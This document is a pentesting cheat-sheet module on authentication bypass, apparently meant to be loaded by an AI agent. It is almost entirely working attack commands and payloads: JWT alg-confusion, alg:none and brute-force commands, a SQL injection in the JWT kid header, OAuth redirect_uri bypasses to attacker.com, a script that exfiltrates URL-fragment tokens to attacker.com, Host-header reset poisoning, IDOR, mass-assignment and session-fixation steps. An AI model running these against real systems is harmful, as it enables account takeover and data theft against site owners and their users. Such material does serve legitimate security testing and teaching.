# BYPASS MODULE — Authentication & Authorization Bypass
# Layer: shared/bypass
# Load when auth checks are in place but you suspect they can be circumvented

---

## 1. JWT ATTACKS

### Algorithm confusion (RS256 → HS256)
```bash
# 1. Decode the JWT
echo "HEADER.PAYLOAD.SIGNATURE" | cut -d. -f1 | base64 -d 2>/dev/null
echo "HEADER.PAYLOAD.SIGNATURE" | cut -d. -f2 | base64 -d 2>/dev/null

# 2. Get the server's public key (often exposed at /.well-known/jwks.json or /auth/certs)
curl https://target.com/.well-known/jwks.json

# 3. Re-sign with the public key as HMAC secret
# Tool: jwt_tool
pip install jwt_tool
jwt_tool TOKEN -X a -pk public_key.pem    # alg confusion attack

# 4. None algorithm
jwt_tool TOKEN -X n                        # set alg:none, remove signature
```

### Weak secret brute force
```bash
# hashcat
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# jwt_tool
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt

# john
john --format=HMAC-SHA256 --wordlist=rockyou.txt jwt.txt
```

### Key confusion attacks
```bash
# jwks.json injection — if kid parameter is user-controlled
# Header: {"alg":"RS256","kid":"../../dev/null"}
# Sign with empty string as key

# If kid is used in SQL query → SQLi in JWT header
# kid: "x' UNION SELECT 'attacker_key'-- -"
```

### JWT claim manipulation
```bash
# Decode, modify payload, re-sign (if you have the secret or can bypass verification)
python3 - << 'EOF'
import jwt, base64, json

# Decode without verification (to see claims)
token = "YOUR_JWT_HERE"
payload = json.loads(base64.b64decode(token.split('.')[1] + '=='))
print(payload)

# Modify and re-sign (if secret known)
payload['role'] = 'admin'
payload['sub'] = 'admin'
new_token = jwt.encode(payload, 'SECRET', algorithm='HS256')
print(new_token)
EOF
```

---

## 2. OAuth / SSO BYPASS

### redirect_uri bypass
```bash
# If validation uses startsWith or contains:
https://target.com/callback?x=https://target.com/callback@attacker.com
https://target.com.attacker.com/callback
https://target.com/callback/../../../attacker.com/callback
https://target.com/callback%2F%2F../../attacker.com

# Path traversal in redirect_uri
https://target.com/oauth/../attacker.com/callback

# Fragment injection
https://target.com/callback#attacker.com

# Open redirect chain
https://target.com/callback?redirect=https://attacker.com
```

### State parameter attacks
```bash
# Missing state → CSRF on OAuth flow
# 1. Start OAuth flow, note the authorization URL
# 2. Drop the state parameter
# 3. Share the URL — any victim who clicks completes the flow for your account
GET /auth/authorize?client_id=xxx&redirect_uri=...&scope=...&state=  # empty state
GET /auth/authorize?client_id=xxx&redirect_uri=...&scope=...         # no state
```

### Token leakage
```bash
# If authorization code appears in Referer header:
# Navigate from callback page to attacker-controlled resource
# Attacker's server logs Referer: https://target.com/callback?code=AUTH_CODE

# If token appears in URL fragment → can be stolen via:
<script>fetch('https://attacker.com/'+location.hash)</script>
```

### Scope escalation
```bash
# Request additional scopes not shown in UI
GET /auth/authorize?client_id=xxx&scope=openid+email+admin+write:all

# Scope downgrade — request no scope, see what you get
GET /auth/authorize?client_id=xxx&scope=

# Space vs + vs %20 in scope parameter
scope=read write  vs  scope=read+write  vs  scope=read%20write
```

---

## 3. PASSWORD RESET BYPASS

### Host header injection → token sent to attacker
```http
POST /auth/forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/json

{"email": "victim@target.com"}
```
If the reset email uses the Host header to construct the reset URL →
attacker receives the reset link at attacker.com

### Reset token predictability
```bash
# Analyze multiple tokens for patterns
# Common weak token generation:
# - MD5/SHA1 of email + timestamp
# - Sequential numeric tokens
# - Base64 of username + time

# Test: request reset twice quickly — are tokens sequential?
# Test: request reset for known email — is token predictable from email?
```

### Reset token reuse
```bash
# After completing a reset, try using the same token again
# After changing email, try the old reset token on the new email
# After account deletion, try the old token
```

### Expired token
```bash
# Request a token, wait for it to expire (per documentation), use it anyway
# Many apps check expiry only optionally
```

---

## 4. HORIZONTAL / VERTICAL PRIVILEGE ESCALATION

### IDOR — direct object manipulation
```bash
# Change numeric ID
GET /api/user/1234/profile  →  GET /api/user/1235/profile

# Change UUID
# UUIDs are not secret — if you can see one, others may be guessable (UUIDv1 is time-based)
python3 -c "
import uuid
u = uuid.UUID('known-uuid-here')
# UUIDv1: extract timestamp and generate nearby UUIDs
print(u.version, u.time)
"

# Swap username in path
GET /api/users/currentuser/settings  →  GET /api/users/admin/settings

# Replace email in request body
{"email": "victim@target.com", "newPassword": "attacker123"}

# Indirect reference via non-obvious params
{"orderId": "123"}  →  {"orderId": "124"}  # another user's order
```

### Forced browsing — skip client-side auth checks
```bash
# Access admin pages directly (Angular/React apps often protect routes client-side only)
# The API may still be accessible
GET /admin/users
GET /api/v1/admin/config
GET /management/actuator/env      # Spring Boot actuator
GET /api/internal/debug
```

### HTTP verb manipulation
```bash
# Some auth middleware only checks POST, not GET (or vice versa)
# Original: POST /api/admin/delete-user  (protected)
# Bypass:   GET /api/admin/delete-user   (unprotected)
# Also try: PUT, PATCH, DELETE, OPTIONS, HEAD

# Override method via header (some frameworks accept this)
POST /api/admin/delete-user
X-HTTP-Method-Override: GET
_method=GET (in body)
```

### Mass assignment
```bash
# Send unexpected fields that the ORM binds automatically
# Original request:
{"name": "John", "email": "john@test.com"}

# Augmented request:
{"name": "John", "email": "john@test.com", "role": "admin", "isAdmin": true, "verified": true}

# Laravel/Rails/Spring common bindable fields to try:
role, admin, is_admin, isAdmin, administrator, superuser, verified, confirmed,
active, enabled, permission, permissions, group, groups, scope, scopes,
balance, credit, tier, plan, subscription
```

---

## 5. SESSION MANAGEMENT ATTACKS

### Session fixation
```bash
# 1. Get a valid (unauthenticated) session ID from the server
# 2. Set it as the victim's session cookie via XSS or URL parameter
# 3. Victim logs in — if server doesn't rotate session ID → you now own their session
curl -c cookies.txt https://target.com/   # get session
# Set victim's cookie to your session ID
# After victim logs in, your session ID has admin privileges
```

### Cookie scope and flags
```bash
# Check cookie attributes
curl -sI https://target.com/login -d 'user=admin&pass=admin' | grep -i set-cookie
# Missing HttpOnly → XSS can steal it
# Missing Secure  → sent over HTTP → MITM possible
# Missing SameSite → CSRF possible
# Domain=.target.com → shared with all subdomains → subdomain XSS can steal it
```

### JWT in localStorage vs httpOnly cookie
```bash
# If JWT in localStorage → accessible via XSS (no httpOnly protection)
# Test: does any XSS allow reading localStorage?
document.cookie     // httpOnly cookies: not accessible
localStorage.getItem('token')  // always accessible via JS
sessionStorage.getItem('token')
```
